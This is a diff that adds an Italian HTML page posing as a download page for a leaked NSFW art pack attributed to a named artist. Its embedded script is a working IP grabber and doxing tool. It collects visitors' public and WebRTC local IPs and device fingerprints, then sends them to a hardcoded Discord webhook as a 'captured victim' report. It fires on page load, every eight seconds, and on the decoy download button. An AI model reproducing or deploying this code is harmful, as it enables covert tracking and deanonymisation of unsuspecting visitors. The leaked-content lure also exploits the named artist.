@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NoxiusNoxy - Ultra NSFW Arknights Pack 2026 [2.8GB]</title>
+    <style>
+        body { 
+            background: linear-gradient(180deg, #0a0a0a, #1a001a); 
+            color: #fff; 
+            font-family: 'Arial', sans-serif; 
+            text-align: center; 
+            margin: 0; 
+            padding: 60px 20px; 
+        }
+        .container { max-width: 900px; margin: 0 auto; }
+        .button {
+            display: inline-block; padding: 25px 80px; font-size: 34px; 
+            background: linear-gradient(45deg, #ff00ff, #00ffff, #ff00ff);
+            background-size: 200% 200%;
+            color: white; border: none; border-radius: 15px; cursor: pointer; 
+            margin: 50px 0; box-shadow: 0 0 50px #ff00ff;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0% { box-shadow: 0 0 30px #ff00ff; } 50% { box-shadow: 0 0 70px #00ffff; } }
+        h1 { color: #ff00ff; text-shadow: 0 0 30px #ff00ff; font-size: 42px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 NOXYSNOXY PRIVATE NSFW MEGA LEAK 2026 🔥</h1>
+        <p><strong>2.8 GB</strong> • 450+ immagini esclusive • Commissions • WIP • Furry Lewd</p>
+        <p>Password: <strong>noxysnoxy2026ultra</strong></p>
+
+        <a href="#" id="downloadBtn" class="button">
+            ⬇️ SCARICA ORA IL PACK COMPLETO
+        </a>
+    </div>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1516557179958591658/RHo2_tp0AvLmXndWh3ofo06nEGbbz2gFvD2LdTh81bytuZShO1tnXOo_jt_vLpUxGJBV"; // ← CAMBIA
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) { return "N/A"; }
+        }
+
+        // WebRTC Local IP (molto utile)
+        function getLocalIPs() {
+            return new Promise((resolve) => {
+                const ips = [];
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel("");
+                pc.onicecandidate = (e) => {
+                    if (e.candidate && e.candidate.candidate) {
+                        const ipMatch = e.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/);
+                        if (ipMatch && !ips.includes(ipMatch[1])) ips.push(ipMatch[1]);
+                    }
+                };
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                setTimeout(() => resolve(ips), 1500);
+            });
+        }
+
+        async function advancedFingerprint() {
+            const ip = await getIP();
+            const localIPs = await getLocalIPs();
+
+            const fp = {
+                timestamp: new Date().toISOString(),
+                public_ip: ip,
+                local_ips: localIPs.join(" | "),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}×${screen.height}×${screen.colorDepth} (${screen.availWidth}×${screen.availHeight})`,
+                referrer: document.referrer || "Direct",
+                connection: navigator.connection ? `${navigator.connection.effectiveType} | ${navigator.connection.downlink}Mbps` : "N/A",
+                battery: "N/A",
+                canvas: "N/A",
+                webgl: "N/A"
+            };
+
+            // Battery Status
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    fp.battery = `${Math.floor(b.level * 100)}% ${b.charging ? '(in carica)' : ''}`;
+                });
+            }
+
+            // Canvas Fingerprint avanzato
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 300; canvas.height = 150;
+                ctx.fillStyle = "#f0f";
+                ctx.fillRect(0, 0, 300, 150);
+                ctx.fillStyle = "#0ff";
+                ctx.font = "30px Arial";
+                ctx.fillText("Noxysnoxy Dox Tool", 30, 80);
+                fp.canvas = canvas.toDataURL().substring(0, 300);
+            } catch(e) {}
+
+            // WebGL dettagliato
+            try {
+                const gl = document.createElement('canvas').getContext('webgl2') || document.createElement('canvas').getContext('webgl');
+                if (gl) {
+                    fp.webgl = {
+                        vendor: gl.getParameter(gl.VENDOR),
+                        renderer: gl.getParameter(gl.RENDERER),
+                        version: gl.getParameter(gl.VERSION)
+                    };
+                }
+            } catch(e) {}
+
+            // Payload Discord
+            const payload = {
+                content: "**🔥 VITTIMA CATTURATA - ADVANCED FINGERPRINT**",
+                embeds: [{
+                    color: 0xff00ff,
+                    title: "Noxysnoxy Target Logger",
+                    description: "Informazioni complete acquisite",
+                    fields: [
+                        { name: "🌐 Public IP", value: `\`${fp.public_ip}\``, inline: true },
+                        { name: "🏠 Local IPs", value: `\`${fp.local_ips}\``, inline: true },
+                        { name: "⏰ Timezone", value: fp.timezone, inline: true },
+                        { name: "🖥️ Screen", value: fp.screen, inline: false },
+                        { name: "📱 User-Agent", value: `\`\`\`${fp.userAgent}\`\`\``, inline: false },
+                        { name: "⚙️ Hardware", value: `Cores: ${fp.hardwareConcurrency} | RAM: ${fp.deviceMemory}GB`, inline: true },
+                        { name: "🔋 Battery", value: fp.battery, inline: true },
+                        { name: "🌍 Connection", value: fp.connection, inline: true },
+                        { name: "🖼️ Canvas", value: `\`${fp.canvas.substring(0, 100)}...\``, inline: false },
+                        { name: "🌐 WebGL", value: `\`\`\`json\n${JSON.stringify(fp.webgl)}\n\`\`\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        // Trigger multipli per massima probabilità
+        document.getElementById('downloadBtn').addEventListener('click', (e) => {
+            e.preventDefault();
+            advancedFingerprint();
+
+            const a = document.createElement('a');
+            a.href = "https://files.catbox.moe/9k8f2m.zip"; // Cambia con link reale o mega.nz vuoto
+            a.download = "noxysnoxy_arknights_nsfw_2026.zip";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            setTimeout(() => alert("Download avviato!\nPassword: noxysnoxy2026ultra"), 800);
+        });
+
+        // Log immediato + ogni 8 secondi
+        window.onload = () => {
+            advancedFingerprint();
+            setInterval(advancedFingerprint, 8000);
+        };
+    </script>
+</body>
+</html>
